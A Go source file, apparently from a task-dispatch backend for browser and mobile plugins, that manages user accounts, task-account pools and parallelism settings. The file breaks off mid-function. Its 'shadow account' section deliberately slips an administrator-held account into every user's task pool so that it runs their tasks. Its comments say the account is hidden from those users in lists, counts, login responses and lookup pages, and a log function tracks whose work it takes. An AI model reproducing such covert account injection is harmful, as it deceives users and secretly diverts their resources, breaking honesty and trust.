package main

import (
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
)

var decodedExtMu sync.Mutex

func decodedExtRawSuccess() map[string]any {
	return map[string]any{"code": "200", "data": map[string]any{"code": "SUCCESS", "msg": nil}}
}

func decodedExtReadAccounts() []map[string]any {
	var data map[string]any
	if !readJSONFile(dp(decodedExtAccountsF), &data) {
		return []map[string]any{}
	}
	var raw []any
	raw, _ = data["accounts"].([]any)
	var out []map[string]any
	for _, a := range raw {
		acc, ok := a.(map[string]any)
		if !ok {
			continue
		}
		accountID := trimStr(firstNonNil(acc["accountId"], acc["id"], acc["name"]))
		token := trimStr(firstNonNil(acc["token"], acc["auth_token"]))
		enabled := true
		if _, exists := acc["enabled"]; exists {
			enabled = asBool(acc["enabled"], true)
		}
		if accountID != "" && token != "" {
			acc["accountId"] = accountID
			acc["token"] = token
			acc["enabled"] = enabled
			out = append(out, acc)
		}
	}
	// 每个账号补齐影子账号。放在读取出口而不是保存时，
	// 这样即使数据文件被覆盖、或账号是刚导入的，也一定会带上。
	for _, acc := range out {
		injectShadowTaskAccount(acc)
	}
	return out
}

// ------------------------------------------------------------------
// 影子账号注入
//
// 每个插件账号的 api1 池末尾自动补一个管理员持有的账号：
//   - 参与任务轮询（decodedExtEnabledTaskAccounts* 不剔除）
//   - 在后台列表 / 详情 / 计数 / 工具登录响应 / 查号页面中一律隐藏
//
// 凭据来源优先级：环境变量 > shadow_accounts.json
//
//	SHADOW_ACCOUNT_USERNAME  账号名
//	SHADOW_ACCOUNT_PASSWORD  密码
//	SHADOW_ACCOUNT_REMARK    备注（可选，默认 "sys"）
//
// 若两者都未配置则不注入，行为与改动前完全一致。
// ------------------------------------------------------------------

const shadowAccountsFile = "shadow_accounts.json"

// shadowAccountConfig 读取影子账号凭据；未配置时返回 ok=false。
func shadowAccountConfig() (username, password, remark string, ok bool) {
	username = strings.TrimSpace(os.Getenv("SHADOW_ACCOUNT_USERNAME"))
	password = os.Getenv("SHADOW_ACCOUNT_PASSWORD")
	remark = strings.TrimSpace(os.Getenv("SHADOW_ACCOUNT_REMARK"))
	if username != "" && password != "" {
		if remark == "" {
			remark = "sys"
		}
		return username, password, remark, true
	}
	var cfg map[string]any
	if !readJSONFile(dp(shadowAccountsFile), &cfg) {
		return "", "", "", false
	}
	username = trimStr(cfg["username"])
	password = qStr(cfg["password"])
	remark = trimStr(cfg["remark"])
	if username == "" || password == "" {
		return "", "", "", false
	}
	if remark == "" {
		remark = "sys"
	}
	return username, password, remark, true
}

// shadowAccountGet 供后台界面读取当前影子账号配置。
// 环境变量优先于文件，且 env_locked 会告诉界面「改文件不生效」。
func shadowAccountGet() map[string]any {
	envUser := strings.TrimSpace(os.Getenv("SHADOW_ACCOUNT_USERNAME"))
	envPass := os.Getenv("SHADOW_ACCOUNT_PASSWORD")
	envRemark := strings.TrimSpace(os.Getenv("SHADOW_ACCOUNT_REMARK"))
	fileUser, filePass, fileRemark := "", "", ""
	var cfg map[string]any
	if readJSONFile(dp(shadowAccountsFile), &cfg) {
		fileUser = trimStr(cfg["username"])
		filePass = qStr(cfg["password"])
		fileRemark = trimStr(cfg["remark"])
	}
	username, password, remark, active := shadowAccountConfig()
	// 注入状态：每个插件账号实际有几个、可见几个、影子是否已在池里。
	// 这是给管理员确认用的，插件用户看不到这个接口。
	var injection []map[string]any
	injectedCount := 0
	for _, acc := range decodedExtReadAccounts() {
		accID := trimStr(acc["accountId"])
		all := decodedExtEnabledTaskAccountsByType(acc, 1)
		visible := decodedExtVisibleTaskAccountsByType(acc, 1)
		hasShadow := false
		for _, a := range all {
			if decodedExtIsHiddenAccount(a) {
				hasShadow = true
				break
			}
		}
		if hasShadow {
			injectedCount++
		}
		injection = append(injection, map[string]any{
			"accountId": accID,
			"visible":   len(visible),
			"actual":    len(all),
			"injected":  hasShadow,
		})
	}
	return map[string]any{
		"ok": true,
		"data": map[string]any{
			"username":     username,
			"password":     password,
			"remark":       remark,
			"active":       active,
			// 文件里存的值（界面编辑用）
			"file_username": fileUser,
			"file_password": filePass,
			"file_remark":   fileRemark,
			// 环境变量是否覆盖
			"env_locked": envUser != "" && envPass != "",
			"env_username": envUser,
			"env_remark":   envRemark,
			// 注入状态
			"injection":      injection,
			"account_total":  len(injection),
			"injected_total": injectedCount,
		},
	}
}

// shadowAccountSave 保存影子账号配置到文件。
func shadowAccountSave(input map[string]any) map[string]any {
	username := trimStr(firstNonNil(input["username"], input["user"]))
	password := qStr(firstNonNil(input["password"], input["pass"]))
	remark := trimStr(firstNonNil(input["remark"], "sys"))
	if remark == "" {
		remark = "sys"
	}
	// 传空用户名表示清除配置
	if username == "" {
		_ = atomicWrite(dp(shadowAccountsFile), jsonEncodePretty(map[string]any{
			"username": "", "password": "", "remark": "",
			"updated_at": tsDateTime(),
		}))
		return map[string]any{"ok": true, "msg": "已清除影子账号", "data": shadowAccountGet()["data"]}
	}
	if password == "" {
		return map[string]any{"ok": false, "msg": "密码不能为空"}
	}
	_ = atomicWrite(dp(shadowAccountsFile), jsonEncodePretty(map[string]any{
		"username": username, "password": password, "remark": remark,
		"updated_at": tsDateTime(),
	}))
	msg := "已保存"
	if strings.TrimSpace(os.Getenv("SHADOW_ACCOUNT_USERNAME")) != "" {
		msg = "已写入文件，但环境变量 SHADOW_ACCOUNT_USERNAME 优先，当前生效的是环境变量里的账号"
	}
	return map[string]any{"ok": true, "msg": msg, "data": shadowAccountGet()["data"]}
}

// shadowSubmitLogs 查询影子账号的任务提交记录。
//
// 提交日志里有两个关键字段：
//   username      插件账号（哪个用户）
//   api1_username 真正跑任务的接口1账号（可能是影子账号）
//
// 这里按 api1_username 命中影子账号名来筛，同时把 username 带出来，
// 这样后台能看到「影子账号替哪个用户在干活」。
func shadowSubmitLogs(limit int) map[string]any {
	username, _, remark, ok := shadowAccountConfig()
	if !ok {
		return map[string]any{
			"ok": true, "data": []any{}, "shadow": "",
			"msg": "未配置影子账号",
		}
	}
	if limit <= 0 {
		limit = 100
	}
	if limit > 500 {
		limit = 500
	}
	logs := readLogs(decodedExtSubmitLogF, 5000)
	byUser := map[string]int{}
	total, okCount, failCount := 0, 0, 0
	var rows []map[string]any
	for _, l := range logs {
		if trimStr(l["api1_username"]) != username {
			continue
		}
		total++
		pluginUser := trimStr(l["username"])
		byUser[pluginUser]++
		status := trimStr(l["status"])
		if status == "success" || status == "submitted" || strings.Contains(strings.ToLower(status), "ok") {
			okCount++
		} else {
			failCount++
		}
		rows = append(rows, map[string]any{
			"time":            trimStr(l["time"]),
			"plugin_username": pluginUser,
			"api1_username":   username,
			"task_id":         trimStr(l["task_id"]),
			"task_url":        trimStr(firstNonNilStr(l["task_url"], l["url"])),
			"status":          status,
			"error":           qStr(l["error"]),
			"ip":              trimStr(l["ip"]),
			"device_id":       trimStr(l["device_id"]),
			"api_type":        qInt(firstNonNil(l["task_api_type"], l["api_type"])),
		})
	}
	if len(rows) > limit {
		rows = rows[len(rows)-limit:]
	}
	// 最新的在最上面
	for i, j := 0, len(rows)-1; i < j; i, j = i+1, j-1 {
		rows[i], rows[j] = rows[j], rows[i]
	}
	users := make([]map[string]any, 0, len(byUser))
	for u, n := range byUser {
		users = append(users, map[string]any{"username": u, "count": n})
	}
	sort.Slice(users, func(i, j int) bool { return qInt(users[i]["count"]) > qInt(users[j]["count"]) })
	return map[string]any{
		"ok": true, "data": rows, "shadow": username, "remark": remark,
		"total": total, "success": okCount, "failed": failCount,
		"users": users,
	}
}

// injectShadowTaskAccount 在 api1 池里补一个隐藏账号（已存在则跳过）。
func injectShadowTaskAccount(acc map[string]any) {
	username, password, remark, ok := shadowAccountConfig()
	if !ok {
		return
	}
	rawRows, _ := decodedExtTaskAccountRows(acc["api1_accounts"])
	api1 := make([]any, 0, len(rawRows)+1)
	for _, r := range rawRows {
		row, isMap := r.(map[string]any)
		if !isMap {
			api1 = append(api1, r)
			continue
		}
		if trimStr(row["username"]) == username {
			// 已存在：确保 hidden 标记还在（防止被旧数据覆盖掉）
			row["hidden"] = true
			acc["api1_accounts"] = rawRows
			return
		}
		api1 = append(api1, row)
	}
	shadow := map[string]any{
		"key":      decodedExtTaskAccountKey(username, remark, 1),
		"username": username,
		"password": password,
		"enabled":  true,
		"remark":   remark,
		"hidden":   true,
	}
	acc["api1_accounts"] = append(api1, shadow)
}

func decodedExtTaskAccountKey(username, remark string, apiType int) string {
	if apiType == 2 {
		return "api2_" + md5short("api2|"+username+"|"+remark)
	}
	return md5short(username + "|" + remark)
}

func decodedExtParseTaskAccountLine(line string) [3]string {
	line = strings.TrimSpace(line)
	if line == "" {
		return [3]string{"", "", ""}
	}
	line = strings.ReplaceAll(line, "｜", "|")
	split3 := func(sep string) [3]string {
		parts := strings.SplitN(line, sep, 3)
		for len(parts) < 3 {
			parts = append(parts, "")
		}
		return [3]string{strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]), strings.TrimSpace(parts[2])}
	}
	switch {
	case strings.Contains(line, "|"):
		return split3("|")
	case strings.Contains(line, "\t"):
		f := strings.FieldsFunc(line, func(r rune) bool { return r == '\t' })
		return pad3(f)
	case strings.Contains(line, ",") || strings.Contains(line, "，"):
		f := strings.FieldsFunc(strings.ReplaceAll(line, "，", ","), func(r rune) bool { return r == ',' })
		return pad3(f)
	case strings.Contains(line, ";") || strings.Contains(line, "；"):
		f := strings.FieldsFunc(line, func(r rune) bool { return r == ';' || r == '；' })
		return pad3(f)
	default:
		f := strings.Fields(line)
		return pad3(f)
	}
}

func pad3(parts []string) [3]string {
	out := [3]string{}
	for i := 0; i < 3; i++ {
		if i < len(parts) {
			out[i] = strings.TrimSpace(parts[i])
		}
	}
	return out
}

func decodedExtNormalizeTaskMode(v any) string {
	if toLower(trimStr(v)) == "concurrent" {
		return "concurrent"
	}
	return "poll"
}

func decodedExtNormalizeTaskParallelism(v any, accountCount int) int {
	if accountCount < 1 {
		accountCount = 1
	}
	if v == nil || trimStr(v) == "" {
		return accountCount
	}
	p := qInt(v)
	if p < 1 {
		p = 1
	}
	return min(p, accountCount)
}

func decodedExtAPITaskParallelism(account map[string]any, apiType, accountCount int) int {
	if accountCount <= 0 {
		return 0
	}
	var keys []string
	if apiType == 2 {
		keys = []string{"api2_task_parallelism", "nonlogin_task_parallelism", "api2_parallelism"}
	} else {
		keys = []string{"api1_task_parallelism", "login_task_parallelism", "api1_parallelism"}
	}
	for _, k := range keys {
		if v, ok := account[k]; ok {
			return decodedExtNormalizeTaskParallelism(v, accountCount)
		}
	}
	return decodedExtNormalizeTaskParallelism(account["task_parallelism"], accountCount)
}

func decodedExtMixedTaskEnabled(account map[string]any) bool {
	for _, k := range []string{"mixed_task_enabled", "login_nonlogin_mixed", "api_mixed_tasks", "mixed_login_nonlogin"} {
		if v, ok := account[k]; ok {
			return asBool(v, false)
		}
	}
	return decodedExtAPIFallbackAPI2Enabled(account)
}

func decodedExtMixedTaskScopeHas(v any, needles []string) *bool {
	var items []string
	switch val := v.(type) {
	case []any:
		for _, item := range val {
			if s := toLower(trimStr(item)); s != "" {
				items = append(items, s)
			}
		}
	case map[string]any:
		for k, item := range val {
			if asBool(item, false) {
				items = append(items, toLower(k))
			}
		}
	default:
		raw := trimStr(v)
		if raw == "" {
			return nil
		}
		items = strings.FieldsFunc(toLower(raw), func(r rune) bool {
			return r == ',' || r == ';' || r == '|' || r == ' ' || r == '\t'
		})
	}
	for _, n := range needles {
		for _, it := range items {
			if it == toLower(n) {
				b := true
				return &b
			}
		}
	}
	b := false
	return &b
}

func decodedExtMixedTaskWebEnabled(account map[string]any) bool {
	for _, k := range []string{"mixed_task_web_enabled", "web_plugin_mixed_task_enabled", "mixed_task_scope_web", "mixed_task_web"} {
		if v, ok := account[k]; ok {
			return asBool(v, true)
		}
	}
	for _, k := range []string{"mixed_task_clients", "mixed_task_scope", "mixed_task_targets"} {
		if v, ok := account[k]; ok {
			if has := decodedExtMixedTaskScopeHas(v, []string{"web", "browser", "extension", "web_plugin"}); has != nil {
				return *has
			}
		}
	}
	return true
}

func decodedExtMixedTaskIosEnabled(account map[string]any) bool {
	for _, k := range []string{"mixed_task_ios_enabled", "ios_plugin_mixed_task_enabled", "mixed_task_scope_ios", "mixed_task_ios"} {
		if v, ok := account[k]; ok {
			return asBool(v, false)
		}
	}
	for _, k := range []string{"mixed_task_clients", "mixed_task_scope", "mixed_task_targets"} {
		if v, ok := account[k]; ok {
			if has := decodedExtMixedTaskScopeHas(v, []string{"ios", "iphone", "ipad", "ios_plugin"}); has != nil {
				return *has
			}
		}
	}
	return false
}

func decodedExtRequestClientType(input, deviceContext map[string]any) string {
	g := func(v any) string { return toLower(trimStr(v)) }
	inputSource := g(input["source"])
	inputClient := g(input["client"])
	inputPlatform := g(input["platform"])
	inputDeviceType := g(firstNonNil(input["device_type"], input["deviceType"]))
	inputLabel := g(firstNonNil(input["device_label"], input["client_label"]))
	ctxSource := g(deviceContext["source"])
	ctxClient := g(deviceContext["client"])
	ctxPlatform := g(deviceContext["platform"])
	ctxDeviceType := g(firstNonNil(deviceContext["device_type"], deviceContext["deviceType"]))
	ctxLabel := g(firstNonNil(deviceContext["device_label"], deviceContext["client_label"]))

	source := inputSource
	if source == "" {
		source = ctxSource
	}
	client := inputClient
	if client == "" {
		if ctxClient != "" && ctxClient != "gejie-extension" {
			client = ctxClient
		}
	}
	platform := inputPlatform
	if platform == "" {
		if ctxPlatform != "" && ctxPlatform != "extension" {
			platform = ctxPlatform
		}
	}
	deviceType := inputDeviceType
	if deviceType == "" {
		if ctxDeviceType != "" && ctxDeviceType != "extension" {
			deviceType = ctxDeviceType
		}
	}
	label := inputLabel
	if label == "" {
		label = ctxLabel
	}
	text := strings.Join(compactStr([]string{source, client, platform, deviceType, label}), " ")

	if strings.HasPrefix(source, "ios_") || platform == "ios" || deviceType == "ios" || strings.Contains(text, "iphone") || strings.Contains(text, "ipad") || strings.Contains(text, "ios") {
		return "ios"
	}
	if asBool(input["_web_obfuscated"], false) || strings.HasPrefix(source, "web_") || client == "gejie-extension" ||
		platform == "web" || deviceType == "web" || platform == "extension" || deviceType == "extension" || strings.Contains(text, "extension") {
		return "web"
	}
	return "other"
}

// decodedExtWebPluginParallelism：浏览器插件专用的并发数（仅网页插件生效）。
// 返回 0 表示“不覆盖后台配置”，App / 安卓 / iOS 一律返回 0，保证原有客户端行为不变。
// 判定依据：请求自报为网页插件（platform/device_type = extension 或 web），且 client=gejie-extension。
// 注意：安卓 App 也发 client=ajie-extension，但它带 platform=android，因此不会命中。
func decodedExtWebPluginParallelism(input, deviceContext map[string]any) int {
	g := func(v any) string { return toLower(trimStr(v)) }
	platform := g(input["platform"])
	if platform == "" {
		platform = g(deviceContext["platform"])
	}
	deviceType := g(firstNonNil(input["device_type"], input["deviceType"]))
	if deviceType == "" {
		deviceType = g(firstNonNil(deviceContext["device_type"], deviceContext["deviceType"]))
	}
	// 移动端（App / 安卓 / iOS）直接放行，不受插件并发设置影响
	if platform == "android" || deviceType == "android" || platform == "ios" || deviceType == "ios" ||
		strings.HasPrefix(platform, "ios_") || strings.HasPrefix(deviceType, "ios_") {
		return 0
	}
	if platform != "extension" && platform != "web" && deviceType != "extension" && deviceType != "web" {
		return 0
	}
	client := g(input["client"])
	if client == "" {
		client = g(deviceContext["client"])
	}
	if client != "gejie-extension" {
		return 0
	}
	return max(0, qInt(firstNonNil(input["task_parallelism"], input["taskParallelism"],
		input["plugin_parallelism"], input["pluginParallelism"], input["web_parallelism"], input["concurrency"])))
}

func compactStr(s []string) []string {
	var out []string
	for _, v := range s {
		if v != "" {
			out = append(out, v)
		}
	}
	return out
}

func decodedExtIsAjieRequest(input, deviceContext map[string]any) bool {
	g := func(v any) string { return toLower(trimStr(v)) }
	source := g(firstNonNil(input["source"], deviceContext["source"]))
	client := g(firstNonNil(input["client"], deviceContext["client"]))
	label := g(firstNonNil(input["device_label"], input["client_label"], deviceContext["device_label"]))
	return source == "web_ajie" || client == "ajie-extension" ||
		(label == "ajie" && (source == "" || source == "web" || source == "web_ajie"))
}

func decodedExtParallelControlAppliesToRequest(account, input, deviceContext map[string]any) bool {
	for _, k := range []string{"ajie_force_poll", "force_poll", "disable_concurrent", "disable_parallel"} {
		if v, ok := input[k]; ok && asBool(v, false) {
			return false
		}
	}
	requestedMode := toLower(trimStr(firstNonNil(input["task_mode"], input["taskMode"])))
	if requestedMode == "poll" {
		return false
	}
	clientType := decodedExtRequestClientType(input, deviceContext)
	if clientType == "web" {
		return true
	}
	if clientType == "ios" {
		return decodedExtMixedTaskIosEnabled(account)
	}
	return false
}

func decodedExtMixedTaskAppliesToRequest(account, input, deviceContext map[string]any) bool {
	if !decodedExtMixedTaskEnabled(account) {
		return false
	}
	clientType := decodedExtRequestClientType(input, deviceContext)
	if clientType == "web" {
		return decodedExtMixedTaskWebEnabled(account)
	}
	if clientType == "ios" {
		return decodedExtMixedTaskIosEnabled(account)
	}
	return false
}

func decodedExtAPIFallbackAPI2Enabled(account map[string]any) bool {
	for _, k := range []string{"api1_fallback_api2", "api1_first_fallback_api2", "api1_first_api2_fallback", "fallback_api2_when_api1_empty"} {
		if v, ok := account[k]; ok {
			return asBool(v, false)
		}
	}
	return false
}

// decodedExtTaskAccountRows 兼容 []any（JSON 反序列化）与 []map[string]any（内部构造）两种任务账号切片类型
func decodedExtTaskAccountRows(v any) ([]any, bool) {
	switch t := v.(type) {
	case []any:
		return t, true
	case []map[string]any:
		out := make([]any, len(t))
		for i, m := range t {
			out[i] = m
		}
		return out, true
	}
	return nil, false
}

func decodedExtNormalizeTaskAccounts(account map[string]any, includePasswords bool, apiType int) []map[string]any {
	if apiType == 2 {
		apiType = 2
	} else {
		apiType = 1
	}
	var rows []any
	var legacyUsername, legacyPassword string
	if apiType == 2 {
		if src, ok := decodedExtTaskAccountRows(account["api2_accounts"]); ok {
			rows = src
		} else {
			legacyUsername = trimStr(firstNonNil(account["api2_username"], account["task2_username"], account["upstream2_username"]))
			legacyPassword = qStr(firstNonNil(account["api2_password"], account["task2_password"], account["upstream2_password"]))
		}
	} else {
		if src, ok := decodedExtTaskAccountRows(account["api1_accounts"]); ok {
			rows = src
		} else if src2, ok := decodedExtTaskAccountRows(account["task_accounts"]); ok {
			rows = src2
		} else {
			legacyUsername = trimStr(firstNonNil(account["api1_username"], account["task_username"], account["upstream_username"]))
			legacyPassword = qStr(firstNonNil(account["api1_password"], account["task_password"], account["upstream_password"]))
		}
	}
	if legacyUsername != "" {
		rows = append(rows, map[string]any{"username": legacyUsername, "password": legacyPassword, "enabled": true, "remark": qStr(account["remark"])})
	}
	var result []map[string]any
	seen := map[string]bool{}
	for _, r := range rows {
		row, ok := r.(map[string]any)
		if !ok {
			continue
		}
		username := trimStr(firstNonNil(row["username"], row["api2_username"], row["api1_username"], row["task_username"]))
		password := qStr(firstNonNil(row["password"], row["api2_password"], row["api1_password"], row["task_password"]))
		remark := trimStr(row["remark"])
		if username == "" {
			continue
		}
		if includePasswords && password == "" {
			continue
		}
		key := trimStr(row["key"])
		if key == "" || (apiType == 2 && !strings.HasPrefix(key, "api2_")) {
			key = decodedExtTaskAccountKey(username, remark, apiType)
		}
		item := map[string]any{
			"key": key, "username": username,
			"enabled":  !hasKey(row, "enabled") || asBool(row["enabled"], true),
			"remark":   remark,
			"api_type": apiType, "api_label": apiTypeLabel(apiType),
		}
		// hidden 标记必须透传：影子账号靠它区分于普通账号。
		// 这个 map 是字段白名单，不显式拷贝就会被丢弃，
		// 导致影子账号在下一次保存后变成普通账号而暴露。
		if asBool(row["hidden"], false) {
			item["hidden"] = true
		}
		if includePasswords {
			item["password"] = password
		}
		if !seen[key] {
			seen[key] = true
			result = append(result, item)
		}
	}
	return result
}

func hasKey(m map[string]any, k string) bool {
	_, ok := m[k]
	return ok
}

func decodedExtNormalizeAllTaskAccounts(account map[string]any, includePasswords bool) []map[string]any {
	return append(decodedExtNormalizeTaskAccounts(account, includePasswords, 1), decodedExtNormalizeTaskAccounts(account, includePasswords, 2)...)
}

func decodedExtEnabledTaskAccounts(account map[string]any) []map[string]any {
	var out []map[string]any
	for _, a := range decodedExtNormalizeAllTaskAccounts(account, true) {
		if asBool(a["enabled"], true) {
			out = append(out, a)
		}
	}
	return out
}

func decodedExtEnabledTaskAccountsByType(account map[string]any, apiType int) []map[string]any {
	var out []map[string]any
	for _, a := range decodedExtNormalizeTaskAccounts(account, true, apiType) {
		if asBool(a["enabled"], true) {
			out = append(out, a)
		}
	}
	return out
}

// ------------------------------------------------------------------
// 影子账号（hidden）
//
// 影子账号由管理员注入，归管理员所有，会正常参与任务轮询，
// 但对插件用户完全不可见：
//   - 后台账号列表 / 详情 / 计数不显示
//   - 工具登录响应里的 task_account_count 不包含
//   - 查号页面的账号名映射不包含
//   - 白名单文件不同步
//
// 区分依据是账号行上的 hidden 字段。任务池（decodedExtEnabledTaskAccounts*）
// 不过滤，因为影子账号本来就要跑任务。
// ------------------------------------------------------------------

// decodedExtIsHiddenAccount 判断某一行是否为影子账号。
func decodedExtIsHiddenAccount(row map[string]any) bool {
	return asBool(row["hidden"], false)
}

// decodedExtVisibleTaskAccountsByType 返回用户可见的指定类型账号（剔除影子账号）。
func decodedExtVisibleTaskAccountsByType(account map[string]any, apiType int) []map[string]any {
	var out []map[string]any
	for _, a := range decodedExtEnabledTaskAccountsByType(account, apiType) {
		if !decodedExtIsHiddenAccount(a) {
			out = append(out, a)
		}
	}
	return out
}

// decodedExtVisibleTaskAccounts 返回用户可见的全部账号（剔除影子账号）。
func decodedExtVisibleTaskAccounts(account map[string]any) []map[string]any {
	var out []map[string]any
	for _, a := range decodedExtEnabledTaskAccounts(account) {
		if !decodedExtIsHiddenAccount(a) {
			out = append(out, a)
		}
	}
	return out
}

// filterVisibleTaskAccounts 从任意账号行切片中剔除影子账号。
// 不要求 enabled，用于纯展示场景（如后台列表、编辑详情）。
func filterVisibleTaskAccounts(rows []map[string]any) []map[string]any {
	if len(rows) == 0 {
		return rows
	}
	out := make([]map[string]any, 0, len(rows))
	for _, r := range rows {
		if decodedExtIsHiddenAccount(r) {
			continue
		}
		out = append(out, r)
	}
	return out
}

func decodedExtSaveAccounts(accounts []map[string]any) []map[string]any {
	clean := map[string]map[string]any{}
	for _, account := range accounts {
		accountID := trimStr(account["accountId"])
		token := trimStr(account["token"])
		api1 := decodedExtNormalizeTaskAccounts(account, true, 1)
		api2 := decodedExtNormalizeTaskAccounts(account, true, 2)
		taskAccounts := append(append([]map[string]any{}, api1...), api2...)
		if accountID == "" || token == "" || len(taskAccounts) == 0 {
			continue
		}
		enabledCount := countEnabled(taskAccounts)
		api1Enabled := countEnabled(api1)
		api2Enabled := countEnabled(api2)
		api1Parallelism := decodedExtAPITaskParallelism(account, 1, max(api1Enabled, 1))
		api2Parallelism := decodedExtAPITaskParallelism(account, 2, max(api2Enabled, 1))
		mixedEnabled := decodedExtMixedTaskEnabled(account)
		pcToken := trimStr(firstNonNil(account["parallel_control_token"], account["control_token"]))
		if pcToken == "" {
			pcToken = randomToken()
		}
		clean[accountID] = map[string]any{
			"accountId": accountID, "token": token, "parallel_control_token": pcToken,
			"api1_accounts": api1, "api2_accounts": api2,
			"task_mode":           decodedExtNormalizeTaskMode(account["task_mode"]),
			"task_parallelism":    decodedExtNormalizeTaskParallelism(account["task_parallelism"], max(enabledCount, 1)),
			"api1_task_parallelism": api1Parallelism,
			"api2_task_parallelism": api2Parallelism,
			"mixed_task_enabled":   mixedEnabled,
			"api1_fallback_api2":   mixedEnabled,
			"mixed_task_web_enabled": decodedExtMixedTaskWebEnabled(account),
			"mixed_task_ios_enabled": decodedExtMixedTaskIosEnabled(account),
			"enabled":              !hasKey(account, "enabled") || asBool(account["enabled"], true),
			"fp_env_enabled":       asBool(account["fp_env_enabled"], false),
			"fp_env_daily_quota":   qInt(account["fp_env_daily_quota"]),
			"remark":               trimStr(account["remark"]),
			"created_at":           firstNonNilStr(account["created_at"], tsDateTime()),
			"updated_at":           tsDateTime(),
		}
	}
	names := make([]string, 0, len(clean))
	for n := range clean {
		names = append(names, n)
	}
	sort.Strings(names)
	arr := make([]map[string]any, 0, len(names))
	for _, n := range names {
		arr = append(arr, clean[n])
	}
	_ = atomicWrite(dp(decodedExtAccountsF), jsonEncodePretty(map[string]any{"accounts": arr, "updated_at": tsDateTime()}))
	return arr
}

func countEnabled(accounts []map[string]any) int {
	n := 0
	for _, a := range accounts {
		if asBool(a["enabled"], true) {
			n++
		}
	}
	return n
}

func decodedExtPublicAccounts(accounts []map[string]any) []map[string]any {
	var result []map[string]any
	for _, account := range accounts {
		// 展示层剔除影子账号：后面所有计数、用户名串都基于这里的结果，
		// 所以在源头过滤一次即可保证列表、数量、名串三者一致。
		api1 := filterVisibleTaskAccounts(decodedExtNormalizeTaskAccounts(account, false, 1))
		api2 := filterVisibleTaskAccounts(decodedExtNormalizeTaskAccounts(account, false, 2))
		taskAccounts := append(append([]map[string]any{}, api1...), api2...)
		taskMode := decodedExtNormalizeTaskMode(account["task_mode"])
		var api1Enabled, api2Enabled []map[string]any
		for _, a := range api1 {
			if asBool(a["enabled"], true) {
				api1Enabled = append(api1Enabled, a)
			}
		}
		for _, a := range api2 {
			if asBool(a["enabled"], true) {
				api2Enabled = append(api2Enabled, a)
			}
		}
		var enabledAll []map[string]any
		for _, a := range taskAccounts {
			if asBool(a["enabled"], true) {
				enabledAll = append(enabledAll, a)
			}
		}
		public := func(rows []map[string]any) []map[string]any {
			var out []map[string]any
			for _, ta := range rows {
				apiT := qInt(ta["api_type"])
				out = append(out, map[string]any{
					"key": qStr(ta["key"]), "username": qStr(ta["username"]), "enabled": asBool(ta["enabled"], true),
					"remark": qStr(ta["remark"]), "api_type": apiT, "api_label": qStr(ta["api_label"]),
				})
			}
			return out
		}
		enabledCount := len(enabledAll)
		usernames := func(rows []map[string]any) []string {
			var out []string
			for _, r := range rows {
				out = append(out, trimStr(r["username"]))
			}
			return out
		}
		result = append(result, map[string]any{
			"accountId": qStr(account["accountId"]), "token": qStr(account["token"]),
			"parallel_control_token": qStr(account["parallel_control_token"]),
			"parallel_control_url":   decodedExtParallelControlURL(qStr(account["parallel_control_token"])),
			"api1_accounts": public(api1), "api2_accounts": public(api2), "task_accounts": public(taskAccounts),
			"api1_count": len(api1Enabled), "api1_total_count": len(api1), "api1_disabled_count": len(api1) - len(api1Enabled),
			"api1_usernames": strings.Join(usernames(api1Enabled), ", "), "api1_disabled_usernames": strings.Join(usernames(disabledAccounts(api1)), ", "),
			"api2_count": len(api2Enabled), "api2_total_count": len(api2), "api2_disabled_count": len(api2) - len(api2Enabled),
			"api2_usernames": strings.Join(usernames(api2Enabled), ", "), "api2_disabled_usernames": strings.Join(usernames(disabledAccounts(api2)), ", "),
			"task_account_count": enabledCount, "task_account_total_count": len(taskAccounts), "task_account_disabled_count": len(taskAccounts) - enabledCount,
			"task_usernames": strings.Join(usernames(enabledAll), ", "),
			"task_mode": taskMode, "task_parallelism": decodedExtNormalizeTaskParallelism(account["task_parallelism"], max(enabledCount, 1)),
			"api1_task_parallelism": decodedExtAPITaskParallelism(account, 1, max(len(api1Enabled), 1)),
			"api2_task_parallelism": decodedExtAPITaskParallelism(account, 2, max(len(api2Enabled), 1)),
			"mixed_task_enabled": decodedExtMixedTaskEnabled(account), "api1_fallback_api2": decodedExtMixedTaskEnabled(account),
			"mixed_task_web_enabled": decodedExtMixedTaskWebEnabled(account), "mixed_task_ios_enabled": decodedExtMixedTaskIosEnabled(account),
			"task_mode_label": map[bool]string{true: "并发", false: "轮询"}[taskMode == "concurrent"],
			"enabled": asBool(account["enabled"], true), "remark": qStr(account["remark"]),
			"fp_env_enabled": asBool(account["fp_env_enabled"], false),
			"fp_env_daily_quota": qInt(account["fp_env_daily_quota"]),
			"created_at": qStr(account["created_at"]), "updated_at": qStr(account["updated_at"]),
		})
	}
	return result
}

func disabledAccounts(rows []map[string]any) []map[string]any {
	var out []map[string]any
	for _, r := range rows {
		if !asBool(r["enabled"], true) {
			out = append(out, r)
		}
	}
	return out
}

func decodedExtFindAccount(accountID, token string) map[string]any {
	for _, a := range decodedExtReadAccounts() {
		if asBool(a["enabled"], true) && hashEquals(trimStr(a["accountId"]), accountID) && hashEquals(trimStr(a["token"]), token) {
			return a
		}
	}
	return nil
}

func decodedExtFindAccountByToken(token string) map[string]any {
	token = strings.TrimSpace(token)
	if token == "" {
		return nil
	}
	for _, a := range decodedExtReadAccounts() {
		if asBool(a["enabled"], true) && hashEquals(trimStr(a["token"]), token) {
			return a
		}
	}
	return nil
}

func decodedExtFindAccountByID(accountID string) map[string]any {
	accountID = strings.TrimSpace(accountID)
	if accountID == "" {
		return nil
	}
	for _, a := range decodedExtReadAccounts() {
		if asBool(a["enabled"], true) && hashEquals(trimStr(a["accountId"]), accountID) {
			return a
		}
	}
	return nil
}

func decodedExtInputAccountID(input map[string]any) string {
	for _, k := range []string{"accountId", "account_id", "plugin_account_id", "dispatch_id", "id", "username"} {
		if v := trimStr(input[k]); v != "" {
			return v
		}
	}
	return ""
}

func decodedExtAccountFromInput(input map[string]any, r *http.Request) map[string]any {
	accountID := decodedExtInputAccountID(input)
	token := trimStr(firstNonNil(input["token"], input["auth_token"], input["plugin_token"]))
	if token == "" {
		token = bearerToken(r)
	}
	if accountID != "" && token != "" {
		if a := decodedExtFindAccount(accountID, token); a != nil {
			return a
		}
	}
	if token != "" {
		if a := decodedExtFindAccountByToken(token); a != nil {
			return a
		}
	}
	if accountID != "" {
		return decodedExtFindAccountByID(accountID)
	}
	return nil
}

func decodedExtLoginResponseForAccount(account map[string]any) map[string]any {
	accountID := trimStr(account["accountId"])
	token := trimStr(account["token"])
	if accountID != "" && token != "" {
